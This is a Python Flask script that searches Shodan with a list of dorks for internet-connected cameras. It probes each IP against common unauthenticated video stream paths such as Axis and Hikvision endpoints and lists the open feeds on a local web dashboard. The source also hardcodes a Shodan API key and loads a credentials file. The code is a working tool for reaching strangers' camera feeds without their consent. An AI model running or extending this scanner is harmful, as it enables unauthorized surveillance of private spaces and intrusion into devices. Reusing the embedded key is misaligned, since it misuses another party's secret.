import json
import threading
import time
from flask import Flask, render_template, jsonify
import shodan
import requests

app = Flask(__name__)

SHODAN_API_KEY = '9r6vVczYqYGR9F3WADASttMPt6fqK2Mm'  
api = shodan.Shodan(SHODAN_API_KEY)

with open('credentials.json') as f:
    credentials = json.load(f)

def load_dorks():
    with open('dorks.txt') as f:
        return [line.strip() for line in f if line.strip()]

dorks = load_dorks()

accessible_cameras = []

def attempt_access(ip):
    video_urls = [
        f"http://{ip}/axis-cgi/mjpg/video.cgi",
        f"http://{ip}/Streaming/channels/1/httpPreview",
        f"http://{ip}/mjpg/video.cgi",
        f"http://{ip}/video.cgi",
        f"http://{ip}/view_feed",
        f"http://{ip}/live",
        f"http://{ip}/Streaming/channels/1/httpPreview",
        f"http://{ip}/cgi-bin/mjpeg.cgi",
        f"http://{ip}/mjpg/video.cgi",
        f"http://{ip}/video.cgi",
        f"http://{ip}/cgi-bin/hi3510/param.cgi?cmd=video",
        f"http://{ip}/video_feed",
        f"http://{ip}/video"
    ]
    
    for video_url in video_urls:
        try:
            
            stream_response = requests.get(video_url, timeout=5, stream=True)
            if stream_response.status_code == 200:
                return True, video_url  
        except requests.exceptions.RequestException:
            continue  
    return False, None 

def search_cameras():
    global accessible_cameras
    while True:
        for dork in dorks:
            try:
                results = api.search(dork)
                for camera in results['matches']:
                    ip = camera['ip_str']
                    if ip not in [cam['ip'] for cam in accessible_cameras]:
                        success, video_url = attempt_access(ip)
                        if success:
                            accessible_cameras.append({'ip': ip, 'image_url': video_url})  
            except Exception as e:
                print(f"Error searching with dork '{dork}': {e}")
        time.sleep(30) 

@app.route('/')
def home():
    return render_template('cameras.html')  

@app.route('/api/cameras')
def get_cameras():
    return jsonify(accessible_cameras)

if __name__ == '__main__':
    threading.Thread(target=search_cameras, daemon=True).start()
    app.run(debug=True, port=5021)